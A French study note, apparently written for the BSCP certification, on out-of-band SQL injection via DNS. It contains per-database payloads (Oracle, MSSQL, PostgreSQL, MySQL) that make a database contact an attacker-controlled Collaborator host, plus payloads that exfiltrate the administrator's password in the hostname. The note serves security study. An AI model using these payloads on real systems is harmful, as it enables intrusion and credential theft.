---
tags: [bscp, server-side, sql-injection]
niveau: practitioner
statut: en cours
---
# SQL injection using out-of-band techniques

## En bref
Quand la requête SQL est exécutée de manière asynchrone, la réponse HTTP ne dépend plus ni des données, ni d'une erreur, ni d'une exécution. Il reste encore une technique: faire émettre par le serveur de base de données une interaction réseau vers une machine contrôlée par l'attaquant.
## Pourquoi le DNS
- Les réseaux de production laissent presque toujours sortir le DNS car il est indispensable.
- La base n'a pas besoin de joindre l'attaquant en TCP: il suffit qu'elle résolve un nom dont l'attaquant contrôle le serveur DNS faisant autorité.
- Pour cela 2 usages:
	- **Détection**: provoquer une requête DNS vers son domaine. Si elle apparaît dans le journal, l'injection est confirmée.
	- **Exfiltration**: Placer le résultat d'une sous-requête dans le nom d'hote (`motdepasse.COLLAB`). La donnée arrive directement dans la requête DNS.
Une conditon peut aussi déclencher l'intéraction(`IF ... exec xp_dirtree`), ce qui donne un booléen sur un canal qui marche en asynchrone.
### Outils
- **Burp Collaborator** : serveur fournissant DNS, HTTP et SMTP. Le client intégré à Burp Suite Professional génère un sous-domaine unique, puis “Poll now” liste les interactions. Domaine actuel : `oastify.com` (ancien : `burpcollaborator.net`).
## Types et variantes
Deux usages existent. La détection provoque une requête DNS vers notre domaine : si elle apparaît dans le journal, l’injection est confirmée. L’exfiltration glisse le résultat d’une sous-requête dans le nom d’hôte (`motdepasse.COLLAB`), et la donnée arrive dans la requête DNS elle-même, sans extraction caractère par caractère. On peut aussi conditionner l’interaction (`IF ... exec xp_dirtree`), ce qui donne un oracle booléen sur un canal qui marche en asynchrone.

Le déclencheur dépend du SGBD :
|SGBD|Payload de détection|
|---|---|
|Oracle|`EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://COLLAB/"> %r;]>'),'/l') FROM dual`|
|MSSQL|`'; exec master..xp_dirtree '//COLLAB/a'--`|
|PostgreSQL|`copy (select '') to program 'nslookup COLLAB'`|
|MySQL|`SELECT LOAD_FILE('\\\\COLLAB\\a')` (Windows uniquement)| 

Pour l’exfiltration, on concatène une sous-requête dans le nom d’hôte.
```sql
Oracle : ... SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/" ...
MSSQL  : declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.COLLAB/a"')
```

Anatomie du payload MSSQL de détection : `'` ferme la chaîne, `;` empile une seconde requête, `xp_dirtree` avec un chemin UNC force la résolution DNS de l’hôte, `--` neutralise la suite de la requête d’origine.
## Comment détecter
On génère un sous-domaine unique avec Burp Collaborator (bouton “Copy to clipboard” du client), on le place dans le payload adapté au SGBD, on envoie avec Repeater, puis on clique sur “Poll now”. Une ligne DNS, parfois HTTP, prouve que la base a bien émis l’interaction. Le sous-domaine étant unique, on sait quelle requête l’a déclenchée.

## Comment exploiter (principe)
1. Repérer un point d’injection où la réponse ne varie jamais (le cookie `TrackingId` dans les labs).
2. Identifier le SGBD, ou tester les payloads de détection l’un après l’autre.
3. Confirmer l’interaction dans Collaborator.
4. Remplacer le sous-domaine par `RÉSULTAT.COLLAB` pour sortir la donnée, et lire le résultat dans le nom de la requête DNS reçue.
5. Encoder le payload en URL s’il passe dans un cookie ou un paramètre.



## Pièges et points d'attention BSCP


## Prévention

## Journal des labs

## Liens
- [[SQL-injection]]
- [[Error-based SQL Injection]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection/cheat-sheet
